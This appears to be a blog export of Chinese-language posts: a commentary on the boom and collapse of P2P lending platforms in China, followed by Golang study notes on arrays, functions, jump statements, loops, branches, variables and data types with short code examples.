贷款在欧美国家，已是“非银行借贷”的主流方式。P2P金融也早就进入中国，但正真兴起是在2014年政府提出“大众创业，万众创新”之后。一时之间，P2P金融像大跃进一样在各大城市火爆开展，各种名目繁多的理财产品推向市场，各种奇奇怪怪的P2P平台遍地开花，开出的薪资水平都高得吓人。 对于P2P金融公司来说，它就是一个平台，本身并不碰钱，你要借钱给谁，多少利息，都是你自己决定，风险也是自己担，它靠收取一定的交易手续费和服务费实现盈利。可是P2P金融在国内却被玩坏了。由于没有有效的监管措施，在我国P2P门槛低，吹牛不犯法，所以短时间内就可以吸引大量用户，人多自然钱就来了，很多P2P公司成立之初也正是看重了这一点，他们做P2P更像是监管投机，而不是做大了赚交易手续费啥的。于是，很多公司玩起了借新还旧(即庞氏骗局): 由于利息高，P2P平台可以很快筹集到很多想理财的资金，这个时候会有两种情况：一是想借钱的人没有那么多，所以，没有把钱借出去，所以就形成了很多资金堆压在自己的平台，换言之是很多钱在平台自己的手上，我们称为资金池。二是，由于平台需要支付给用户的利息高，那么筹集资金的成本也就会很高，那么放贷的利息也就会很高。也就是说，一般只有那种从正规低成本渠道（银行）贷不出钱的，靠着资金借新还旧续命的企业或者个人才会去借着样的钱，所以这样借出去的钱风险会特别高。 对于第一种情况，一旦平台的钱积累到一定的数目，那么会玩的平台就开始拿资金池里的钱付前面钱的利息，因为只要后面的钱源源不断的进来，那么前面的钱一直就会有利息拿，而且这个利息很高。对于第二种情况，一旦很多借出去的钱最后都还不了，平台就会像第一种情况那样后面的钱去支付前面的钱所需要的利息。但是，不管怎么看，在老百姓看来，这平台挺好的，钱放里面啥也不用干，一年能拿个百分之十几的利息，所以也不会着急去取。 但是，问题来了。 一旦资金达到一个规模，后面的钱填不上前面的利息，或者出现前面的钱开始有人在取的时候，那么资金池里的钱会越来越少，最后就会出现资金链断裂，断裂之后会引发大量的出金赎回，又形成了更大的断裂。 所以，到最后平台发现玩崩了，撑不下去就只能跑路了。 暑假回家，与朋友交流，发现我们那五六线的小县城都开始搞P2P金融了。朋友说，当时身边很多人都投了，收入十分可观啊，大家都觉得觉得不买的才是傻子啊，每天稳赚，收益比存银行高多了。但是，后来平台倒了，血本无归啊。 近期P2P平台大量暴雷，跑路、停业、提现困难，今年倒闭停业的P2P机构清单令人触目惊心。据不完全统计，自6月起至今的50天内，大约有212家网贷平台出现跑路失联、平台停业、主动退出、提现困难等情况，平均每天发生问题的平台多达4.24家。以每个平台5000个投资人估计，受害人多达百万之众。另外，根据统计，仅7月份（7月2日—7月16日），就有131家网贷平台暴雷，很多规模非常大的网贷平台，就这样轰然倒下，让投资人都难以相信。 前面也说到，其实P2P金融还是有它存在的价值，只要国家能够加强监管力度，使其发挥积极的作用，那对于国家、社会甚至是个人都是有益处的。也相信，经过这几年的清洗和沉淀，这个行业会越来越成熟，也还是会有投资的价值。 最近看到一篇文章，P2P平台大量暴雷后，那么多公司的员工去哪了？调查发现，大部分都去了区块链公司，很多P2P金融初创公司由于无法完成备案都转型做区块链了。话说，这两年的币圈确实也是火得不行啊，颇有当年P2P金融的势头。但是，P2P得今天会不会是区块链的明天呢？下次有时间再聊聊区块链。]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golang笔记-数组]]></title>
    <url>%2F2018%2F08%2F25%2FGolang%E7%AC%94%E8%AE%B0-%E6%95%B0%E7%BB%84%2F</url>
    <content type="text"><![CDATA[Golang 数组学习 一维数组 数组占用的内存是连续的，因此CPU能把正在使用的数据缓存更久的时间，而且更容易计算索引，可以快速迭代数组里的所有元素。数组是具有相同 唯一类型 的一组已编号且长度固定的数据项序列。数组长度也是数组类型的一部分，所以[5]int和[10]int是属于不同类型的。 声明与初始化 数组中元素的类型是相同的，每个元素是通过索引来访问的，索引从0到数组长度减1。声明格式： 1var identifier [len]type 例如声明一个整型数组，声明时所有的元素都会被自动初始化为默认值 0 ： 1var array [6]int // 默认初始值为0 也可以在声明的同时初始化指定值： 1var array = [6]int&#123;1,2,3&#125; // 定义同时初始化，只初始化前3个值 使用简写方式声明并初始化指定值： 1array := [6]int&#123;1,2,3&#125; // := 简写 让 Go 语言自动计算声明数组的长度： 1array := [...]int&#123;1,2,3&#125; // 省略长度，又由初始值的个数决定 声明的同时初始化指定元素的值： 1array := [6]int&#123;1: 10, 3: 20&#125; // 初始化指定索引的值，其它保持为0 Go内置的函数len可以返回数组中的元素个数。 12var array [6]intfmt.Println(len(array)) // 输出为6 Go 语言中的数组是一种 值类型（不像 C/C++ 中是指向首元素的指针），所以也可以使用 new() 来创建数组，此方法返回一个指向数组的指针： 1array := new([6]int) 另外，数组之间可以使用 == 或 != 进行比较，但不可以使用 &lt; 或 &gt; 。 赋值与迭代 声明后按索引为数组元素赋值： 12var array [6]intarray[0] = 1 // 按索引赋值 使用 for range 迭代数组： 1234567for i, v := range array&#123; // 输出索引和值，i代表索引, v代表索引位置对应的值&#125;for _, v := range array&#123; // 仅输出值，不要使用索引时用下划线&#125; 数组指针与指针数组 数组指针：数组指针可以说成是”数组的指针”，首先这个变量是一个指针，其次，”数组”修饰这个指针，意思是说这个指针存放着一个数组的首地址，或者说这个指针指向一个数组的首地址。 123array := [3]int&#123;1, 2, 3&#125;var arr = &amp;arrayfmt.Println(arr[0]) // 输出1 指针数组：指针数组可以说成是”指针的数组”，首先这个变量是一个数组，其次，”指针”修饰这个数组，意思是说这个数组的所有元素都是指针类型，在32位系统中，指针占四个字节。 123var a, b, c = 1, 2, 3array := [3]*int&#123;&amp;a, &amp;b, &amp;c&#125;fmt.Println(*array[0]) // 输出1 多维数组 二维数组是最简单的多维数组，二维数组本质上是由一维数组组成的。二维数组定义方式如下： 1var identifier [x][y]type 示例： 1234array := [2][3]int&#123;&#123;1, 2, 3&#125;, &#123;4, 5, 6&#125;&#125; // 二维数组，2行3列fmt.Println(array)fmt.Println(array[0])fmt.Println(array[0][0]) 输出结果： 123[[1 2 3] [4 5 6]][1 2 3]1 传递数组给函数值传递 使用值传递的例子： 123456789101112func main() &#123; array := [3]int&#123;1, 2, 3&#125; x := sum(array) fmt.Println(x)&#125;func sum(arr [3]int) (sum int) &#123; for _, v := range arr &#123; sum += v &#125; return&#125; 但是，如果我们的数组非常大，每次调用函数都是值传递的话，那么每次都必须在栈上分配很大内存，造成不必要的内存消耗。 引用传递 如上所属，把一个大数组传递给函数会消耗很多内存。可以使用引用传递来避免这种现象，可以传递数组的指针，也可以使用数组的切片。 123456789101112func main() &#123; array := [3]int&#123;1, 2, 3&#125; x := sum(&amp;array) // 传递数组的地址 fmt.Println(x)&#125;func sum(arr *[3]int) (sum int) &#123; // 参数为指针 for _, v := range arr &#123; sum += v &#125; return&#125;]]></content>
      <categories>
        <category>Programming language</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golang笔记-函数]]></title>
    <url>%2F2018%2F08%2F25%2FGolang%E7%AC%94%E8%AE%B0-%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[Golang 函数学习 定义与声明 函数是基本的代码块。Go 是编译型语言，所以函数编写的顺序是无关紧要的；鉴于可读性的需求，最好把 main() 函数写在文件的前面，其他函数按照一定逻辑顺序进行编写（例如函数被调用的顺序）。 Go 语言函数定义格式如下： 1234func function_name( [parameter list] ) [return_types]&#123; // 函数体&#125; 函数由关键字 func 开始声明，参数列表指定的是参数类型、顺序、及参数个数。参数是可选的，也就是说函数也可以不包含参数。返回类型，函数返回一列值。return_types 是该列值的数据类型。例如： 123func sum(a int, b int) int&#123; return a + b&#125; Go 里面有三种类型的函数： 普通的带有名字的函数 匿名函数或者lambda函数（后续博客介绍） 方法（后续博客介绍） 函数被调用的基本格式如下： 1pack.Function(arg1, arg2, …, argn) 其中，Function 是 pack 包中的函数，括号里的是被调用函数的实参。同文件内函数调用不要加包名。 注意：函数重载指的是可以编写多个同名函数，只要它们拥有不同的形参与/或者不同的返回值，在 Go 里面函数重载是不被允许的。 参数与返回值 除了main()、init()函数外，其它所有类型的函数都可以有参数与返回值。 参数列表 函数如果使用参数，该变量可称为函数的形参。形参就像定义在函数体内的局部变量。 123func sum(a int, b int) int&#123; return a + b&#125; 参数类型相同的情况： 123func sum(a, b int) int&#123; return a + b&#125; 可变长参数： 1234567891011121314func main() &#123; var x, y, z = 1, 2, 3 a := sum(x) b := sum(x, y) c := sum(x, y, z) fmt.Println(a, b, c) // 输出1 3 6&#125;func sum(a ...int) (sum int) &#123; // 使用可变长参数 for _, v := range a &#123; // 使用for range迭代可变长参数 sum += v &#125; return&#125; 值传递 Go 默认使用按值传递来传递参数，也就是传递参数的副本。函数接收参数副本之后，在使用变量的过程中可能对副本的值进行更改，但不会影响到原来的变量。 12345678910func main() &#123; var x, y = 1, 2 a, b := exchange(x, y) // 传值 fmt.Println(a, b) // 输出2, 1&#125;func exchange(a, b int) (x, y int) &#123; x, y = b, a return&#125; 引用传递 如果需要直接修改参数的值，而不是对参数的副本进行操作，你需要将参数的地址（变量名前面添加 &amp; 符号）传递给函数，这就是按引用传递。 12345678910func main() &#123; var x, y = 1, 2 exchange(&amp;x, &amp;y) // 传地址 fmt.Println(x, y) // 输出2 1&#125;func exchange(a, b *int) &#123; // 由于传入的是地址，所以如果在函数内修改a,b的值，x,y的值也会改变 *a, *b = *b, *a&#125; 传递指针给函数不但可以节省内存（因为没有复制变量的值），而且赋予了函数直接修改外部变量的能力，所以被修改的变量不再需要使用 return 返回。几乎在任何情况下，传递指针（一个32位或者64位的值）的消耗都比传递副本来得少。 （具体案例将在后续博客中介绍） 返回值 有返回值的函数，一般必须有明确的 return 语句。返回值可命名也可不命名，命名的返回值和参数一样可以当作局部变量使用。例如： 123func sum(a, b int) int &#123; return a + b&#125; 返回值命名后，return 可以写成显式也可以隐式。 12345func sum(a, b int) (z int) &#123; z = a + b return z // 显式 // return 也可以没有z 隐式返回&#125; Go 语言可以返回零个或多个值，相比与 C、C++、Java 和 C#，多值返回是 Go 的一大特性，为我们判断一个函数是否正常执行提供了方便。Go 语言的函数经常使用两个返回值来表示执行是否成功：返回某个值以及 true 表示成功；返回零值（或 nil）和 false 表示失败。 1234567var orig string = "ABC"// var orig string // 会发生错误an, err := strconv.Atoi(orig)if err != nil &#123; // 判断是否转换成功 fmt.Printf("orig %s is not an integer - exiting with error\n", orig) return&#125; 如上，我们使用 strconv 包中的 Atoi 函数将一个字符串转换为一个整数，如果转换成功则 err 返回 nil 否则返回具体的错误类型。那么我们就可以通过判断 err ，如果确实存在错误，则会打印相应的错误信息然后通过 return 提前结束函数的执行。 defer 关键字 defer 允许我们推迟到函数返回之前（或任意位置执行 return 语句之后）一刻才执行某个语句或函数。 1234func main() &#123; defer fmt.Println("world") fmt.Println("Hello")&#125; 输出结果： 12Helloworld 关键字 defer 允许我们进行一些函数执行完成后的收尾工作，一般用于释放某些已分配的资源： 关闭文件流 解锁一个加锁的资源 关闭数据库连接 …… 当有多个 defer 行为被注册时，它们会以逆序执行（类似栈，即后进先出）： 123for i := 0; i &lt; 5; i++ &#123; defer fmt.Printf("%d ", i)&#125; 输出结果： 14 3 2 1 0 内置函数 Go 语言拥有一些不需要进行导入操作就可以使用的内置函数： 名称 说明 close 用于管道通信 len、cap len 用于返回某个类型的长度或数量（字符串、数组、切片、map 和管道）；cap 是容量的意思，用于返回某个类型的最大容量（只能用于切片和 map） new、make new 和 make 均是用于分配内存：new 用于值类型和用户定义的类型，如自定义结构，make 用于内置引用类型（切片、map 和管道）。它们的用法就像是函数，但是将类型作为参数：new(type)、make(type)。new(T) 分配类型 T 的零值并返回其地址，也就是指向类型 T 的指针。它也可以被用于基本类型：v := new(int)。make(T) 返回类型 T 的初始化之后的值，因此它比 new 进行更多的工作new() 是一个函数，不要忘记它的括号 copy、append 用于复制和连接切片 panic、recover 两者均用于错误处理机制 print、println 底层打印函数，在部署环境中建议使用 fmt 包 complex、real imag 用于创建和操作复数]]></content>
      <categories>
        <category>Programming language</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golang笔记-跳转]]></title>
    <url>%2F2018%2F08%2F23%2FGolang%E7%AC%94%E8%AE%B0-%E8%B7%B3%E8%BD%AC%2F</url>
    <content type="text"><![CDATA[Golang 跳转学习。 break 与 continuebreak break 的作用范围为该语句出现后的最内部的结构，它可以被用于任何形式的 for 循环（计数器、条件判断等）。但在 switch 或 select 语句中，break 语句的作用结果是跳过整个代码块，执行后续的代码。 break 只会退出最内层的循环： 123456789for i := 0; i &lt; 3; i++ &#123; for j := 0; j &lt; 8; j++ &#123; if j &gt; 4 &#123; break &#125; fmt.Print(j) &#125; fmt.Println("")&#125; 输出结果： 123012340123401234 continue 关键字 continue 忽略剩余的循环体而直接进入下一次循环的过程，但不是无条件执行下一次循环，执行之前依旧需要满足循环的判断条件。 注意：continue 关键字只能用在 for 循环中。 1234567for i := 0; i &lt; 10; i++ &#123; if i == 5 &#123; continue &#125; fmt.Print(i) fmt.Print(" ")&#125; 输出结果： 10 1 2 3 4 6 7 8 9 label 与 goto for、switch 或 select 语句都可以配合标签（LABEL）形式的标识符使用，即某一行第一个以冒号（:）结尾的单词（gofmt 会将后续代码自动移至下一行）。 123456789101112// LABEL: 标签放在这里会造成死循环 for i := 0; i &lt; 3; i++ &#123; for j := 0; j &lt; 8; j++ &#123; if j &gt; 4 &#123; goto LABEL &#125; fmt.Print(j) &#125; fmt.Println("") &#125;LABEL: fmt.Println("\nLABEL......") 输出结果： 1201234LABEL...... goto LABEL的 LABEL (标签) 既可以定义在for循环前面，也可以定义在for循环后面，当跳转到标签地方时，继续执行标签下面的代码。 特别注意： 使用标签和 goto 语句是不被鼓励的：它们会很快导致非常糟糕的程序设计，而且总有更加可读的替代方案来实现相同的需求。 如果必须使用 goto，应当只使用正序的标签（标签位于 goto 语句之后），但注意标签和 goto 语句之间不能出现定义新变量的语句，否则会导致编译失败。 break 、 continue 也可以和 LABEL 结合来使用实现跳转到指定的目标层级： break + LABEL 跳出外层循环，break 的跳转标签( LABEL )必须放在循环语句 for 前面，并且在break LABEL 跳出循环不再执行 for 循环里的代码： 1234567891011LABEL: for i := 0; i &lt; 3; i++ &#123; for j := 0; j &lt; 10; j++ &#123; if j &gt; 5 &#123; break LABEL &#125; fmt.Print(j) &#125; fmt.Println("") &#125; fmt.Println("\nLABEL......") 输出结果： 12012345LABEL...... break + LABEL 实现跳出内层循环： 1234567891011LABEL: for i := 0; i &lt; 3; i++ &#123; for j := 0; j &lt; 8; j++ &#123; if j &gt; 4 &#123; continue LABEL &#125; fmt.Print(j) &#125; fmt.Println("") // LABEL在外层，该语句不会被执行 &#125; fmt.Println("\nLABEL......") 输出结果： 12012340123401234LABEL...... continue 的跳转标签( LABEL )也必须放在循环语句 for 前面，continue + LABEL 实现与 break 一样的功能： 1234567891011for i := 0; i &lt; 3; i++ &#123; LABEL: for j := 0; j &lt; 8; j++ &#123; if j &gt; 4 &#123; continue LABEL &#125; fmt.Print(j) &#125; fmt.Println("") // LABEL在这一层，该语句会执行&#125;fmt.Println("\nLABEL......") 输出结果： 12345012340123401234LABEL......]]></content>
      <categories>
        <category>Programming language</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golang笔记-循环结构]]></title>
    <url>%2F2018%2F08%2F23%2FGolang%E7%AC%94%E8%AE%B0-%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84%2F</url>
    <content type="text"><![CDATA[Golang 循环结构学习。 虽然 Go语言中没有 while 关键字，但是它的 for 语句更加灵活，可以实现其它语言中 while 和 do while 的功能。 基于计数器的 for 基本形式： 1for 初始化语句; 条件语句; 修饰语句 &#123;&#125; 这三部分组成的循环的头部，它们之间使用分号; 相隔，但并不需要括号 () 将它们括起来。同样的，左花括号 { 必须和 for 语句在同一行，计数器的生命周期在遇到右花括号} 时便终止。 单层循环： 123for i := 0; i &lt; 3; i++ &#123; fmt.Println(i)&#125; 还可以在循环中同时使用多个计数器： 123for i, j := 0, 3; i &lt; j; i, j = i+1, j-1 &#123; fmt.Println(i, j)&#125; 其中，i, j = 0, 3 是平行赋值操作。 多层（嵌套）循环： 12345for i := 0; i &lt; 3; i++ &#123; for j := 2; j &gt; 0; j-- &#123; fmt.Println(i, j) &#125;&#125; 基于条件判断的 for 基于计数器的 for 也可以省略修饰语句，将其移到循环体内： 1234for i := 0; i &lt; 3; &#123; i++ fmt.Println(i)&#125; 还可以把初始化语句提到循环体前，变成没有初始化语句和修饰语句的 for 结构，那么 ;; 便可以省略： 12345var i = 0for i &lt; 3 &#123; i = i + 1 fmt.Println(i)&#125; 无限循环 如果 for 循环的头部没有条件语句，那么就会认为条件永远为 true，因此循环体内必须有相关的条件判断以确保会在某个时刻退出循环。 123for &#123; // 循环体&#125; 想要直接退出循环体，可以使用 break 语句或 return 语句直接返回 。但这两者之间有所区别，break 只是退出当前的循环体，而 return 语句提前对函数进行返回，不会执行后续的代码。 for-range 结构 Go 特有的一种的迭代结构， 可以迭代任何一个集合，包括 array 和 map 。例如，迭代 array ： 123456for i, v := range 数组名&#123; // 输出索引和值，i代表索引, v代表索引位置对应的值&#125;for _, v := range 数组名&#123; // 仅输出值，不要使用索引时用下划线&#125; 示例： 1234var array = [3]int&#123;1, 2, 3&#125;for i, v := range array &#123; fmt.Println(i, v)&#125; 输出结果： 1230 11 22 3 要注意的是，v 始终为集合中对应索引的值拷贝，因此它一般只具有只读性质，对它所做的任何修改都不会影响到集合中原有的值（如果 v 为指针，则会产生指针的拷贝，依旧可以修改集合中的原值）。 一个字符串是 Unicode 编码的字符（或称之为 rune）集合，因此您也可以用它迭代字符串： 1234var str = "abcd"for i, v := range str &#123; fmt.Printf("%d, %c\n", i, v)&#125; 输出结果： 12340, a1, b2, c3, d 每个 rune 字符和索引在 for-range 循环中是一一对应的。它能够自动根据 UTF-8 规则识别 Unicode 编码的字符。]]></content>
      <categories>
        <category>Programming language</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golang笔记-分支结构]]></title>
    <url>%2F2018%2F08%2F22%2FGolang%E7%AC%94%E8%AE%B0-%E5%88%86%E6%94%AF%E7%BB%93%E6%9E%84%2F</url>
    <content type="text"><![CDATA[Golang 分支结构学习。 if-else 与其它语言的 if-else 没有什么区别。其中，条件语句不需要括号。 1234567if condition1 &#123; // do something &#125; else if condition2 &#123; // do something else &#125; else &#123; // catch-all or default&#125; 需要注意的是： 即使当代码块之间只有一条语句时，大括号也不可被省略 关键字 if 和 else 之后的左大括号 { 必须和关键字在同一行，如果你使用了 else-if 结构，则前段代码块的右大括号 } 必须和 else-if 关键字在同一行。这两条规则都是被编译器强制规定的。 当条件比较复杂时，则可以使用括号让代码更易读。条件允许是符合条件，需使用 &amp;&amp;、|| 或 !，你可以使用括号来提升某个表达式的运算优先级，并提高代码的可读性。 if 可以包含一个初始化语句。这种写法具有固定的格式（在初始化语句后方必须加上分号）： 123if initialization; condition &#123; // do something&#125; 例如： 12345678910val := 10if val &gt; max &#123; // do something&#125;可以写为:if val := 10; val &gt; max &#123; // do something&#125; 注意：使用简短方式 :=声明的变量的作用域只存在于 if 结构中（在 if 结构的大括号之间，如果使用 if-else 结构则在 else 代码块中变量也会存在）。如果变量在 if 结构之前就已经存在，那么在 if 结构中，该变量原来的值会被隐藏。最简单的解决方案就是不要在初始化语句中声明变量。 switch 相比较 C 和 Java 等其它语言而言，Go 语言中的 switch 结构使用上更加灵活。首先，case 中不需要break ，其次，它接受任意形式的表达式： 12345678switch var1 &#123; case val1: ... case val2: ... default: ...&#125; 变量 var1 可以是任何类型，而 val1 和 val2 则可以是同类型的任意值。类型不被局限于常量或整数，但必须是相同的类型；或者最终结果为相同类型的表达式。前花括号 { 必须和 switch 关键字在同一行。也可以同时测试多个可能符合条件的值，使用逗号分割它们，例如：case val1, val2, val3。 每一个 case 分支都是唯一的，从上至下逐一测试，直到匹配为止。一旦成功地匹配到某个分支，在执行完相应代码后就会退出整个 switch 代码块，也就是说您不需要特别使用 break 语句来表示结束。如果在执行完每个分支的代码后，还希望继续执行后续分支的代码，可以使用 fallthrough 关键字来达到目的。注意，相邻的空 case 块不构成多条件匹配。如下： 123456789101112switch i &#123; case 0: // 空分支，只有当 i == 0 时才会进入分支 case 1: f() // 当 i == 0 时函数不会被调用&#125;switch i &#123; case 0: fallthrough case 1: f() // 当 i == 0 时函数也会被调用&#125; switch 语句也可以不提供任何被判断的值（实际上默认为判断是否为 true），然后在每个 case 分支中进行测试不同的条件。当任一分支的测试结果为 true 时，该分支的代码会被执行。这看起来非常像链式的 `if-else 语句，但是在测试条件非常多的情况下，提供了可读性更好的书写方式。 12345678switch &#123; case condition1: ... case condition2: ... default: ...&#125; switch 语句还包含一个初始化语句： 12345678switch initialization &#123; case val1: ... case val2: ... default: ...&#125; 与其他语言一样，用 default 可以指定当其他所有分支都不匹配的时候的行为。]]></content>
      <categories>
        <category>Programming language</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golang笔记-变量与常量]]></title>
    <url>%2F2018%2F08%2F22%2FGolang%E7%AC%94%E8%AE%B0-%E5%8F%98%E9%87%8F%E4%B8%8E%E5%B8%B8%E9%87%8F%2F</url>
    <content type="text"><![CDATA[Golang 变量与常量学习。 变量声明与赋值 Go 和许多编程语言不同，它在声明变量时将变量的类型放在变量的名称之后。一般形式是使用 var 关键字： 1var identifier type 示例： 123var a intvar b boolvar str string 也可以写成： 12345var ( a int b bool str string) 这种因式分解关键字的写法一般用于声明全局变量。如果一个变量在函数体外声明，则被认为是全局变量，可以在整个包甚至外部包（被导出后）使用，不管你声明在哪个源文件里或在哪个源文件里调用该变量。在函数体内声明的变量称之为局部变量，它们的作用域只在函数体内，参数和返回值变量也是局部变量。 变量的命名规则遵循骆驼命名法，即首个单词小写，每个新单词的首字母大写。但如果你的全局变量希望能够被外部包所使用，则需要将首个单词的首字母也大写（前面的博客有介绍可见性规则）。 当一个变量被声明之后，系统自动赋予它该类型的零值：int 为 0，float 为 0.0，bool 为 false，string 为空字符串，指针为 nil。记住，所有的内存在 Go 中都是经过初始化的。 变量可以编译期间就被赋值，赋值给变量使用运算符等号 =，当然你也可以在运行时对变量进行赋值操作。 123a = 15b = truestr = "hello" 当然，和其它语言一样，也可以声明的同时赋值： 123var a int = 15var b bool = truevar str string = "hello" 不同的是，Go 语言可以根据变量的值来自动推断其类型，类似于Python。也就可以这样写： 123var a = 15var b = truevar str = "hello" 但是，这样的写法有时候也不是万能的。比如，当你想要给变量的类型并不是自动推断出的某种类型时，你还是需要显式指定变量的类型： 1var a int64 = 15 以上写法主要用于声明包级别的全局变量，当你在函数体内声明局部变量时，应使用简短声明语法 := 1a := 15 在相同的代码块中，不可以再次对于相同名称的变量使用初始化声明。例如： 123var a inta := 15 // 编译错误，重复初始化声明a = 15 // 正确 如果声明了一个局部变量却没有在相同的代码块中使用它，同样会得到编译错误。而全局变量则允许声明后不使用。 同一类型的多个变量可以声明在同一行： 1var x, y, z int 多变量可以在同一行进行赋值（已经声明的前提下）： 1a, b, str = 15, true, "hello" 也可以使用简短声明初始化： 1a, b, str := 15, true, "hello" 要交换两个变量的值，可以按下面的方式写，这样省去了使用交换函数的必要： 1a, b = b, a 值类型和引用类型 值类型 所有基本类型都属于值类型，使用这些类型的变量直接指向存在内存中的值。像数组和结构这些复合类型也是值类型。当使用等号 = 将一个变量的值赋值给另一个变量时，实际上是在内存中将值进行了拷贝。值类型的变量的值存储在栈中。可以通过取地址符号 &amp; 来获取变量的内存地址。 内存地址会根据机器的不同而有所不同，甚至相同的程序在不同的机器上执行后也会有不同的内存地址。因为每台机器可能有不同的存储器布局，并且位置分配也可能不同。 引用类型 在 Go 语言中，指针属于引用类型，其它的引用类型还有 slices，maps 和 channel。引用类型的变量存储的是变量的值所在的内存地址（数字），或内存地址中第一个字所在的位置。 同一个引用类型的指针指向的多个字可以是在连续的内存地址中（内存布局是连续的），这也是计算效率最高的一种存储形式；也可以将这些字分散存放在内存中，每个字都指示了下一个字所在的内存地址。当使用赋值语句时，只有引用（地址）被复制。 如果引用类型变量的值被改变了，那么这个值的所有引用都会指向被修改后的内容。被引用的变量会存储在堆中，以便进行垃圾回收，且比栈拥有更大的内存空间。 类型转换 Go中不存在隐式转换，所有类型转换必须显式声明，并且转换只能发生在两种相互兼容的类型之间。例如： 123var ch byte = 97//var a int = ch // 错误，不会隐式转换var a int = int(ch) 可以使用标准库中的方法实现整形到字符串的转换： 123var i int = 1 var s string s = strconv.Itoa(i) 或者 s = FormatInt(int64(i), 10) 同样，字符串到整形： 123var s string = "1" var i int i, err = strconv.Atoi(s) 或者 i, err = ParseInt(s, 10, 0) 字符串到 float32 或 float64 ： 123var s string = 1 var f float32 f, err = ParseFloat(s, 32) ……等等，具体去查看标准库中相关的包。 常量声明与赋值 常量使用关键字 const 定义，用于存储不会改变的数据。存储在常量中的数据类型只可以是布尔型、数字型（整数型、浮点型和复数）和字符串型。定义格式： 1const identifier [type] = value Go 语言中，可以省略类型说明符 [type]，因为编译器可以根据变量的值来推断其类型。一个没有指定类型的常量被使用时，会根据其使用环境而推断出它所需要具备的类型。换句话说，未定义类型的常量会在必要时刻根据上下文来获得相关类型。 12const b string = "abc" // 显式类型定义const b = "abc" // 隐式类型定义 常量的值必须是能够在编译时就能够确定的；你可以在其赋值表达式中涉及计算过程，但是所有用于计算的值必须在编译期间就能获得。因为在编译期间自定义函数均属于未知，因此无法用于常量的赋值，但内置函数可以使用，如：len()。 常量也允许使用并行赋值的形式： 1const a, b = 1, 2 在定义常量组时，如果不提供初始值，则表示将使用上行的表达式，即 b 的值也等于 1 。 1234const( a = 1 b) 常量之所以为常量就是恒定不变的量，因此我们无法在程序运行过程中修改它的值；如果你在代码中试图修改常量的值则会引发编译错误。 枚举类型 普通值枚举类型 Go 语言中，没有直接支持枚举的关键字，也就造成 Go 没有直接枚举的功能，但是可以使用 const 后跟一对圆括号的方式定义一组常量实现定义普通枚举类型。 12345const ( English = 0 Chinese = 1 Math = 2) 自增值枚举类型 也可以使用 const 和 iota 的方式来定义自增值枚举类型。常量生成器 iota 常量声明中，iota 从 0 开始取值 。在每一个 const 关键字出现时，被重置为 0 ，然后再下一个 const 出现之前，每出现一次 iota ，其所代表的数字会自动增加 1。 12345const a = iota // a=0 const ( b = iota //b=0 c //c=1 ) 定义数量级的例子： 123456789const ( b = 1 &lt;&lt; (10 * iota) kb mb gb tb pb)fmt.Println(b, kb, mb, gb, tb, pb) 输出结果： 11 1024 1048576 1073741824 1099511627776 1125899906842624 如果 iota 中间出现插队的情况，那么后续的值会使用插队的值： 123456789const ( b = 1 &lt;&lt; (10 * iota) kb mb = 1000 gb tb pb)fmt.Println(b, kb, mb, gb, tb, pb) 输出结果： 11 1024 1000 1000 1000 1000 再次通过 iota 来重新开始使用 iota 的计数作为枚举值： 123456789const ( b = 1 &lt;&lt; (10 * iota) kb mb = 1000 gb tb = iota pb)fmt.Println(b, kb, mb, gb, tb, pb) 输出结果： 11 1024 1000 1000 4 5]]></content>
      <categories>
        <category>Programming language</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golang笔记-数据类型与运算符]]></title>
    <url>%2F2018%2F08%2F22%2FGolang%E7%AC%94%E8%AE%B0-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%B8%8E%E8%BF%90%E7%AE%97%E7%AC%A6%2F</url>
    <content type="text"><![CDATA[Golang 数据类型与运算符学习。 基本数据类型 Go 语言基本数据类型分为数字、字符串和布尔型，以下是具体介绍： 布尔型：bool 长度：1字节 取值范围：true, false 注意事项：不可以用数字代表true或false 整型：int/uint 根据运行程序所在的操作系统类型所决定的，可能为32或64位。int 型是计算最快的一种类型。 8位整型：int8/uint8 长度：1字节 取值范围：-128~127/0~255 字节型：byte（uint8别名） 16位整型：int16/uint16 长度：2字节 取值范围：-32768~32767/0~65535 32位整型：int32（rune）/uint32 长度：4字节 取值范围：-2^32/2~2^32/2-1/0~2^32-1 64位整型：int64/uint64 长度：8字节 取值范围：-2^64/2~2^64/2-1/0~2^64-1 浮点型：float32/float64 长度：4/8字节 小数位：float32 精确到小数点后 7 位，float64 精确到小数点后 15 位。由于精确度的缘故，你在使用 == 或者 != 来比较浮点数时应当非常小心。 复数：complex64/complex128 长度：8/16字节 足够保存指针的 32 位或 64 位整数型：uintpt 字符串：string 类型零值：零值并不等于空值，而是当变量被声明为某种类型后的默认值，通常情况下值类型的默认值为0，bool 为 false，string 为空字符串 格式化说明符 格式化输出时需要根据数据类型指定输出格式，Go 语言中使用的格式化说明符有： 布尔值 %t：true 或 false。 普通值： %v：相应值的默认格式。 %T：相应值的类型的Go语法表示。 整数 %b：二进制表示 %d：十进制表示 %o：八进制表示 %q：单引号围绕的字符字面值，由Go语法安全地转义 %x：十六进制表示，字母形式为小写 a-f %X：十六进制表示，字母形式为大写 A-F 浮点数与复数 %b：无小数部分的，指数为二的幂的科学计数法，与 strconv.FormatFloat的 ‘b’ 转换格式一致。例如 -123456p-78 %e：科学计数法，例如 -1234.456e+78 %E：科学计数法，例如 -1234.456E+78 %f：有小数点而无指数，例如 123.456 %g：根据情况选择 %e 或 %f 以产生更紧凑的（无末尾的0）输出 %G：根据情况选择 %E 或 %f 以产生更紧凑的（无末尾的0）输出 字符串和字节切片 